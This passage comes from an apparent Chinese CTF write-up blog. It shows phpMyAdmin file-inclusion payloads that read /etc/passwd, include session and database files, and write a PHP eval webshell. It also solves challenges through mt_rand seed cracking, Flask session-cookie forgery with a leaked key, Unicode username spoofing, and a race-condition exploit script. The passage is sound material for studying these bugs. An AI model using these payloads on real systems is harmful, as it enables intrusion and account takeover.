class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    ); <span class="comment">//按?分割字符串，取前半部分</span></span><br><span class="line">    <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $_page = urldecode($page);</span><br><span class="line">    $_page = mb_substr(</span><br><span class="line">        $_page,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    ); <span class="comment">//按?分割字符串，取前半部分</span></span><br><span class="line">    <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基本上和题目代码一样，白名单有好多文件可以利用</p><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/白名单.png" style="zoom: 80%;"><p>这里是用的vulhub靶场，里面有这个漏洞的复现环境，直接docker搭建</p><p>构造payload类似于以下形式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?target=db_sql.php%<span class="number">25</span>%<span class="number">33</span>%<span class="number">66</span>/../../../../etc/passwd</span><br></pre></td></tr></table></figure><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/包含测试.png" style="zoom:80%;"><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><h4 id="方式1-包含session"><a href="#方式1-包含session" class="headerlink" title="方式1 包含session"></a>方式1 包含session</h4><p>先执行条sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>查看session_id</p><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/session.png" style="zoom:80%;"><p>包含，payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target=db_sql.php%<span class="number">253</span>f/../../../../../tmp/sess_d3455e637bcc0b69789190c6ffb4cd18</span><br></pre></td></tr></table></figure><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/包含session.png" style="zoom:80%;"><p>个人在linux上搭建的环境好像不能直接执行有一句话的sql语句然后包含session来getshell</p><p>最好的方式还是找有写入权限的目录写马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT <span class="string">&quot;&lt;?php file_put_contents(&#x27;moonback.php&#x27;,&#x27;&lt;?php eval(<span class="subst">$_POST</span>[1]);?&gt;&#x27;);?&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><h4 id="方式2-包含数据库文件"><a href="#方式2-包含数据库文件" class="headerlink" title="方式2 包含数据库文件"></a>方式2 包含数据库文件</h4><p>创建一个数据表，里面插入一句话</p><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/写入.png" style="zoom: 50%;"><p>查询一下该表的路径</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&#x27;%datadir%&#x27;</span>;</span><br></pre></td></tr></table></figure><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/sql路径.png" style="zoom:80%;"><p>然后直接包含就行，payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?target=db_sql.php%<span class="number">253</span>f/../../../../../<span class="keyword">var</span>/lib/mysql/test/shell.frm</span><br></pre></td></tr></table></figure><p>在linux上尝试没包含成功，猜测可能是权限问题</p><h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><h3 id="writeup-1"><a href="#writeup-1" class="headerlink" title="writeup"></a>writeup</h3><p>我TM心态崩了啊，同一个session应该生成的随机数一样啊，试了好久，都快哭了</p><p>源码可以看到，访问<code>check.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">&#x27;seed&#x27;</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line">$str_long1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">$str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.$str_show.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">&#x27;num&#x27;</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">&quot;check.php&quot;</span>); </span><br></pre></td></tr></table></figure><p>知道前10位了，我们可以使用php_mt_seed多个参数爆破种子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">pwd=<span class="string">&quot;Mu7S5Y076i&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pwd:</span><br><span class="line">print(str(s.index(i))+<span class="string">&quot; &quot;</span>+str(s.index(i))+<span class="string">&quot; 0 61 &quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/TIM截图20200203200954.png" style="zoom:80%;"><p>找到种子，注意版本，只需用原来的加密方式就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">mt_srand(<span class="number">666994457</span>);</span><br><span class="line">$str_long1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">$str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.$str.<span class="string">&quot;&lt;/p&gt;&quot;</span>; </span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/TIM截图20200203201222.png" style="zoom:80%;"><p>提交即可得flag</p><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/TIM截图20200203201418.png" style="zoom:80%;"><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><h3 id="writeup-2"><a href="#writeup-2" class="headerlink" title="writeup"></a>writeup</h3><p>参考：<a href="https://www.anquanke.com/post/id/164086">https://www.anquanke.com/post/id/164086</a></p><p>打开注册登陆，在index页面看到<code>you are not admin</code>，在change password页面源代码里看到有个github地址</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https://github.com/woadsl1234/hctf_flask/</span></span><br></pre></td></tr></table></figure><p>下载到本地，发现是python2的flask项目，在<code>templates/index.html</code>看到</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if current_user.is_authenticated and session[&#x27;name&#x27;] == &#x27;admin&#x27; %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>hctf&#123;xxxxxxxxx&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>登陆admin即可得到flag</p><p><code>routes.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/code&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code</span>():</span></span><br><span class="line">    image, code = get_verify_code()</span><br><span class="line">    <span class="comment"># 图片以二进制形式写入</span></span><br><span class="line">    buf = BytesIO()</span><br><span class="line">    image.save(buf, <span class="string">&#x27;jpeg&#x27;</span>)</span><br><span class="line">    buf_str = buf.getvalue()</span><br><span class="line">    <span class="comment"># 把buf_str作为response返回前端，并设置首部字段</span></span><br><span class="line">    response = make_response(buf_str)</span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/gif&#x27;</span></span><br><span class="line">    <span class="comment"># 将验证码字符串储存在session中</span></span><br><span class="line">    session[<span class="string">&#x27;image&#x27;</span>] = code</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/index&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, title = <span class="string">&#x27;hctf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/register&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&#x27;image&#x27;</span>).lower() != form.verify_code.data.lower():</span><br><span class="line">            flash(<span class="string">&#x27;Wrong verify code.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form=form)</span><br><span class="line">        <span class="keyword">if</span> User.query.filter_by(username = name).first():</span><br><span class="line">            flash(<span class="string">&#x27;The username has been registered&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        user = User(username=name)</span><br><span class="line">        user.set_password(form.password.data)</span><br><span class="line">        db.session.add(user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;register successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/login&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = name</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> user.check_password(form.password.data):</span><br><span class="line">            flash(<span class="string">&#x27;Invalid username or password&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        login_user(user, remember=form.remember_me.data)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, title = <span class="string">&#x27;login&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/logout&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>():</span></span><br><span class="line">    logout_user()</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/change&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(session[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;change successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;change.html&#x27;</span>, title = <span class="string">&#x27;change&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/edit&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        </span><br><span class="line">        flash(<span class="string">&#x27;post successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;edit.html&#x27;</span>, title = <span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">error</span>):</span></span><br><span class="line">    title = unicode(error)</span><br><span class="line">    message = error.description</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;errors.html&#x27;</span>, title=title, message=message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span>(<span class="params">username</span>):</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><p>在<code>config.py</code>看到secret_key,可以考虑session伪造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>(<span class="params">object</span>):</span></span><br><span class="line">    SECRET_KEY = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;ckj123&#x27;</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">&#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27;</span></span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>flask session加密解密工具github地址：<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_manager.py decode -c -s </span><br><span class="line"><span class="comment"># -c是flask cookie里的session值 -s参数是SECRET_KEY</span></span><br><span class="line">python flask_session_manager.py encode -s -t </span><br><span class="line"><span class="comment"># -s参数是SECRET_KEY -t参数session解密后的格式</span></span><br></pre></td></tr></table></figure><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/TIM截图20200503104534.png" style="zoom:80%;"><p>替换就可以得到flag，其实可以不用这么长的session，直接下面这样也行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager2.py encode -s ckj123 -t <span class="string">&quot;&#123;u&#x27;user_id&#x27;: u&#x27;10&#x27;, u&#x27;name&#x27;: u&#x27;admin&#x27;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>这题还可以用unicode欺骗，不难发现登陆注册页面对<code>session[&#39;name&#39;]</code>的操作都进行了<code>strlower</code>函数的操作,而strlower又如下调用了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.words.protocols.jabber.xmpp_stringprep <span class="keyword">import</span> nodeprep</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span>(<span class="params">username</span>):</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><p>在<code>requirements.txt</code>看到twisted的版本是<code>10.2.0</code>，目前版本都<code>20.3.0</code>了，刚好该版本存在漏洞</p><p>nodeprep.prepare函数会将unicode字符<code>ᴬ</code>转换成<code>A</code>，而<code>A</code>在调用一次nodeprep.prepare函数会把<code>A</code>转换成<code>a</code></p><p>所以我们注册<code>ᴬdmin</code>此时调用一次变成<code>Admin</code>，再修改一次密码就能再调用一次变成<code>admin</code>,此时修改的就是admin的密码，这种方法也能getflag</p><p>这题还能用条件竞争的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = name</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(session[<span class="string">&#x27;name&#x27;</span>])</span><br></pre></td></tr></table></figure><p>可以看到这登陆和改密码操作在没有完全check身份的情况下，执行了session有关的赋值</p><p>因此我们可以用条件竞争的方法，一个改密码，一个退出登陆并以admin登陆，exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">s, username, password</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.post(<span class="string">&quot;http://admin.2018.hctf.io/login&quot;</span>, data=data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s.get(<span class="string">&quot;http://admin.2018.hctf.io/logout&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">s, newpassword</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;newpassword&#x27;</span>:newpassword</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.post(<span class="string">&quot;http://admin.2018.hctf.io/change&quot;</span>, data=data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span>(<span class="params">s</span>):</span></span><br><span class="line">    login(s, <span class="string">&#x27;skysec&#x27;</span>, <span class="string">&#x27;skysec&#x27;</span>)</span><br><span class="line">    change(s, <span class="string">&#x27;skysec&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func2</span>(<span class="params">s</span>):</span></span><br><span class="line">    logout(s)</span><br><span class="line">    res = login(s, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;skysec&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(<span class="string">&#x27;finish&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        s = requests.Session()</span><br><span class="line">        t1 = threading.Thread(target=func1, args=(s,))</span><br><span class="line">        t2 = threading.Thread(target=func2, args=(s,))</span><br><span class="line">        t1.start()</span><br><span class="line">        t2.start()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    